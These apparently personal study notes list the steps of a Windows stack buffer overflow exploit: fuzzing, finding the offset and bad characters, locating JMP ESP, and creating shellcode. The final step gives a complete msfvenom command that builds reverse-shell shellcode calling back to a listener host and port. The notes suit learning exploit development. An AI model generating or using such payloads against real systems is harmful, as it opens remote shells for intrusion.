1. Fuzz
- Use Spiking
- Use simple python script
2. Find offset
- Use metasploit `pattern_create` and `pattern offset`
3. Find bad character
- Immunity https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
4. Find module and JMP ESP
- Use metasploit nasm_shell
- Use debugger and mona to find JMP ESP
5. Create shellcode
 ''' 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 '''
